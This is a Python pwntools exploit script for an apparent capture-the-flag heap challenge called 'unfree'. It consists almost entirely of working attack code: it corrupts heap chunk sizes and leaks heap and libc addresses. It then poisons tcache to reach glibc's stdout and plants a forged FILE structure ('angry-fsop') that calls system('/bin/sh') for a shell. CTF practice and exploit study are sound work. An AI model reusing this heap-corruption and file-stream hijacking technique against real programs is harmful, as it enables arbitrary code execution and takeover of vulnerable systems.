#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./unfree_patched')
context.log_level = 'debug'

libc = elf.libc

#p = remote("unfree.ctfz.zone", 17171)
p = process(elf.path)
assert p

def sendopt(opt):
    p.sendlineafter(b'Exit\n', str(opt).encode())

def create(idx, size, data):
    sendopt(1)
    p.sendlineafter(b'add\n', str(idx).encode())
    p.sendlineafter(b'size\n', str(size).encode())
    p.sendafter(b'data:\n', data)

def edit(idx, data):
    sendopt(2)
    p.sendlineafter(b'edit\n', str(idx).encode())
    p.sendafter(b'data:\n', data)

def view(idx):
    sendopt(3)
    p.sendlineafter(b'read\n', str(idx).encode())

create(0, 0x500, b'A')
create(18, 0x328, b'M'*0x328 + p64(0x531))
create(1, 0x580, b'XXXX')
create(2, 0x548, b'B'*0x548 + p64(0x521))
create(3, 0x560, b'PAD')
create(4, 0x580, b'CONS')
create(5, 0x500, b'\xe0')
view(5)
heap = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x21ae0
info(f"heap @ {hex(heap)}")
create(6, 0x4f0, b'\x50')
view(6)
libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x203f50
info(f"libc @ {hex(libc.address)}")
assert libc.address > 0
create(7, 0x3e8, b'C'*0x3e8 + p64(0x111))
create(8, 0x9d1, b'wtf')
create(9, 0x508, b'D'*0x508 + p64(0x111))
create(10, 0x101, b'w3')
edit(9, b'D'*0x508 + p64(0xf1) + p64(libc.sym['_IO_2_1_stdout_'] ^ ((heap+0x65f20) >> 12)))

#########################
# angry-fsop

stdout_lock = libc.address + 0x205710
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
gadget = libc.address + 0x1724f0

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
print(hex(len(fake)))

create(11, 0xe8, b'aaaa')
create(12, 0xe8, bytes(fake))



p.interactive()

